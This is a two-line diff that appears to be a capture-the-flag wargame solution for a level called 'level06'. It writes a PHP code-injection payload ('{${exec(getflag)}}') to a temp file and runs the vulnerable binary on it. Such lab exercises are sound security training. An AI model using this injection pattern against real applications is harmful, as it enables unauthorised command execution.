@@ -1,0 +1,2 @@
+echo '[x {${exec(getflag)}}]' > /tmp/exploit06
+./level06 /tmp/exploit06
